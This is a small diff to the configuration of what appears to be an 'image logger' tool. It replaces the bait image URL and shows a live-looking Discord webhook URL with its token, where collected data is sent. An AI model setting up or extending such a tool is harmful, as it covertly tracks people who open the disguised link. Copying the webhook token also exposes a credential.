@@ -13,7 +13,7 @@ __author__ = "C00lB0i"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1485425347368583279/uXIhz9-eFD3-APDDplMjji2sR8DvmEGKrtDhwGNPIQ-FLrIdhq-B6TgE_eX4WSSd_dTw",
-    "image": "https://i0.wp.com/www.greatwidetravel.com/wp-content/uploads/2020/08/DSW_4294.jpg?resize=768%2C513&ssl=1", # You can also have a custom image by using a URL argument
+    "image": "https://media.istockphoto.com/id/153690526/photo/t-90-is-a-russian-main-battle-tank.jpg?s=1024x1024&w=is&k=20&c=r352Upe7r7aU25pw5OO4695-EhgpXtBwn5kHfJS1Ezk=", # You can also have a custom image by using a URL argument
                                                # (E.g. https://image-logger-51.vercel.app/=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
